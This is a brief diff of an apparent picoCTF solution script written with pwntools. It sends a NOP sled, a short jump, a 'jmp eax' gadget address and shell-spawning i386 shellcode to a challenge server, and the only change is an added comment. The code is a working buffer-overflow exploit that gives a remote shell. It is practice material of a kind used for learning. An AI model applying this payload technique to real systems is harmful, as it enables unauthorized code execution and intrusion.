@@ -2,7 +2,7 @@ from pwn import *
 # p=process("./vuln")
 p=remote("saturn.picoctf.net", 53540)
 pay=b"\x90"*26
-pay+=b"\xeb\x04"
+pay+=b"\xeb\x04" #jump short 4 bytes
 pay+=p32(0x0805333b) #jmp eax
 pay+=asm(shellcraft.i386.linux.sh())
 p.sendline(pay)
